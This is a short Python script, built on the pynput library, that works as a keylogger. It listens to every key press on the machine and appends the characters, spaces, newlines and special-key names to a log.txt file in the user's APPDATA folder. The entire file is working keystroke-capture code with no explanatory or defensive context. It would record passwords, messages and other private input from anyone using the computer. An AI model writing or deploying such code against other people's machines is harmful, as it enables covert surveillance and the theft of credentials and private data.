from pynput import keyboard
import os

# Define log file location
log_file = os.path.join(os.getenv("APPDATA"), "log.txt")
print(f"Logging keystrokes to: {log_file}")  # Debugging output

# Function to write keystrokes to the log file
def write_to_file(key):
    with open(log_file, "a") as file:
        file.write(key)

# Key press handler
def on_press(key):
    try:
        if key == keyboard.Key.space:
            write_to_file(" ")
        elif key == keyboard.Key.enter:
            write_to_file("\n")
        elif hasattr(key, 'char'):
            write_to_file(key.char)
        else:
            write_to_file(f" [{key}] ")  # Special keys like Shift, Ctrl, etc.
    except Exception as e:
        print(f"Error: {e}")  # Print errors for debugging

# Start listening for keypresses
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
